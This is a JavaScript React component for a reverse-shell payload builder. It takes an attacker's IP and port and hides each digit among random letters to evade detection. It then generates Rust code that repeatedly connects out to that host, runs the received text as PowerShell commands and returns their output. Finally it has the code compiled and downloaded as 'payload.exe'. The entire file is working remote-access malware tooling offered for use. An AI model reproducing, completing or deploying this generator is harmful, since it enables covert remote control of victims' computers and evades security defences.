import axios from "axios"
import { useState } from "react"
import classes from "./Generator.module.css"
import fileDownload from "js-file-download"

const Generator = () => {
    const [IP, setIP] = useState("127.0.0.1")
    const [port, setPort] = useState("80")
    const [fullCode, setFullCode] = useState("Generate Code!")

    const onIpChange = (e) => {
        setIP(e.target.value)
    }

    const onPortChange = e => {
        setPort(e.target.value)
    }

    const generateCode = (IP, port) => {
        let generateRand = (min, max) => {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }
        let alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        let first = IP.match(/[0-9]+/g, '')[0].split("").reverse().map((el) => {
            let charCount = generateRand(3, 5)
            for (let i = 0; i < charCount; i++) {
                el = alphabet[generateRand(1, 52)] + el + alphabet[generateRand(1, 52)]
            }
            return el
        }).join("")
        let second = IP.match(/[0-9]+/g, '')[1].split("").reverse().map((el) => {
            let charCount = generateRand(3, 5)
            for (let i = 0; i < charCount; i++) {
                el = alphabet[generateRand(1, 52)] + el + alphabet[generateRand(1, 52)]
            }
            return el
        }).join("")
        let third = IP.match(/[0-9]+/g, '')[2].split("").reverse().map((el) => {
            let charCount = generateRand(3, 5)
            for (let i = 0; i < charCount; i++) {
                el = alphabet[generateRand(1, 52)] + el + alphabet[generateRand(1, 52)]
            }
            return el
        }).join("")
        let fourth = IP.match(/[0-9]+/g, '')[3].split("").reverse().map((el) => {
            let charCount = generateRand(3, 5)
            for (let i = 0; i < charCount; i++) {
                el = alphabet[generateRand(1, 52)] + el + alphabet[generateRand(1, 52)]
            }
            return el
        }).join("")
        let _port = port.split("").reverse().map((el) => {
            let charCount = generateRand(3, 5)
            for (let i = 0; i < charCount; i++) {
                el = alphabet[generateRand(1, 52)] + el + alphabet[generateRand(1, 52)]
            }
            return el
        }).join("")
        console.log(first)
        return (
            `
        let IP1: String = "${first}".chars().rev().filter(|c| c.is_digit(10)).collect();
        let IP2: String = "${second}".chars().rev().filter(|c| c.is_digit(10)).collect();
        let IP3: String = "${third}".chars().rev().filter(|c| c.is_digit(10)).collect();
        let IP4: String = "${fourth}".chars().rev().filter(|c| c.is_digit(10)).collect();
        let _Port: String = "${_port}".chars().rev().filter(|c| c.is_digit(10)).collect();
        `)
    }

    const onGeneratePayload = () => {
        let generatedCode = generateCode(IP, port)
        let fullCode =
            `    
        use std::io::{Read, Write};
        use std::net::TcpStream;
        use std::process::{Command, Stdio};
        use std::str::from_utf8;
        use std::{thread, time};
        
        fn main() {
            loop {
            ` + generatedCode +
            `
            match TcpStream::connect(
                [
                    IP1,
                    ".".to_string(),
                    IP2,
                    ".".to_string(),
                    IP3,
                    ".".to_string(),
                    IP4,
                    ":".to_string(),
                    _Port,
                ]
                .join(""),
            ) {
                Ok(mut stream) => {
                    println!("Successfully connected to server in port 80");
                    // stream.write(msg).unwrap();
                    let mut data = [0; 1024]; // using 6 byte buffer
                    match stream.read(&mut data) {
                        Ok(_) => {
                            let text = from_utf8(&data).unwrap();
                            let text = text.trim_matches(char::from(0));
                            println!("{}", text);
                            let output = Command::new("powershell")
                                .args([text])
                                .stdout(Stdio::piped())
                                .output()
                                .expect("failed to execute process");
                            stream.write(&output.stdout).unwrap();
                            // println!("{}", output.stdout.len());
                            println!("Reply: {:?}", String::from_utf8_lossy(&output.stdout));
                        }
                        Err(e) => {
                            println!("Failed to receive data: {}", e);
                        }
                    }
                }
                Err(e) => {
                    println!("Failed to connect: {}", e);
                }
            }
            println!("Terminated.");
            thread::sleep(time::Duration::from_secs(5));
        }
    }
        `
        setFullCode(fullCode)
    }


    const onSubmitHandler = (e) => {
        e.preventDefault()
        axios.post("http://127.0.0.1:4000/generate", { data: fullCode })
            .then(res => {
                axios({
                    url: 'http://127.0.0.1:4000/download',
                    method: 'GET',
                    responseType: 'blob', // Important
                }).then((res) => {
                    fileDownload(res.data, 'payload.exe');
                });
                console.log(res)
            })
    }

    return (
        <div className={classes.Generator}>
            <pre className={classes.Pre}><code>{fullCode}</code></pre>
            <div className={classes.InputDiv}>
                <label htmlFor="ip">IP:</label>
                <input onChange={onIpChange} value={IP} id="ip" className={classes.Input} />
            </div>
            <div className={classes.InputDiv}>
                <label htmlFor="port">Port:</label>
                <input onChange={onPortChange} value={port} id="port" className={classes.Input} />
            </div>
            <form onSubmit={onSubmitHandler} className={classes.Form}>
                <button className={classes.ButtonDownload}>Download payload</button>
            </form>
            <button onClick={onGeneratePayload} className={classes.ButtonPayload}>Generate Payload</button>
        </div>
    )
}

export default Generator